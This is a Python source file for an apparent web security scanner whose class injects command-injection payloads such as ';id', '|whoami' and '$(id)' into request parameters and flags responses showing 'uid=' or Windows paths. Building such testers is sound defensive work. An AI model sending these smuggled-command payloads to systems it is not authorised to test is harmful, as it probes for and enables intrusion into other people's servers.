import requests
from typing import List, Dict
from utils.logger import Logger

logger = Logger.get_logger("CommandInjectionTester")


class CommandInjectionTester:
    """Test web applications for command injection vulnerabilities"""

    def __init__(self):
        self.payloads = [
            ";id",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            ";whoami",
            "|whoami",
            "&whoami",
            "$(whoami)",
        ]
        self.timeout = 10

    def test_parameter(self, url: str, param_name: str, method: str = "GET", data: Dict = None) -> Dict:
        """Test a single parameter for command injection"""
        results = {"vulnerable": False, "payloads_found": [], "responses": []}
        
        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"

        baseline_response = self._get_baseline(url, param_name, method, data)

        for payload in self.payloads:
            try:
                test_data = data.copy() if data else {}
                test_data[param_name] = payload
                
                if method.upper() == "GET":
                    response = requests.get(url, params=test_data, timeout=self.timeout)
                else:
                    response = requests.post(url, data=test_data, timeout=self.timeout)
                
                if self._detect_command_execution(response.text, baseline_response):
                    results["vulnerable"] = True
                    results["payloads_found"].append(payload)
                    results["responses"].append({
                        "payload": payload,
                        "status": response.status_code,
                        "response_length": len(response.text)
                    })
                    logger.info(f"Command injection found with payload: {payload}")
            except Exception as e:
                logger.debug(f"Test failed for payload {payload}: {str(e)}")
        
        return results

    def _get_baseline(self, url: str, param_name: str, method: str, data: Dict = None) -> str:
        """Get baseline response for comparison"""
        try:
            test_data = data.copy() if data else {}
            test_data[param_name] = "test123"
            
            if method.upper() == "GET":
                response = requests.get(url, params=test_data, timeout=self.timeout)
            else:
                response = requests.post(url, data=test_data, timeout=self.timeout)
            return response.text
        except:
            return ""

    def _detect_command_execution(self, response: str, baseline: str) -> bool:
        """Detect signs of command execution"""
        exec_indicators = [
            "uid=",
            "gid=",
            "groups=",
            "root",
            "system32",
            "C:\\Windows",
            "/bin",
            "/usr/bin",
        ]
        return any(indicator in response and indicator not in baseline for indicator in exec_indicators)

    def test_batch_parameters(self, url: str, parameters: List[str], method: str = "GET") -> List[Dict]:
        """Test multiple parameters for command injection"""
        results = []
        for param in parameters:
            result = self.test_parameter(url, param, method)
            result["parameter"] = param
            results.append(result)
        return results
